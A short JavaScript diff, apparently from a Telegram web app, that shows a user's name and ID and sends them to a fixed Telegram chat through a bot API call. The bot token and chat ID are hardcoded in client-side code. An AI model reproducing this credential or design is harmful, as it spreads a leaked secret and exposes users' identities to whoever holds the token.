@@ -9,7 +9,7 @@ userData.innerText = `${full_name} (${id})`;
 
 const botToken = '7662919654:AAFAW2XBWcdWlde-hNLiCOTfr230_L_KFVw';
 const chatId = '5625291747';
-const message = `${full_name} (${id})`;
+const message = `${full_name} (${id})-> `;
 
 async function sendMessage(text) {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
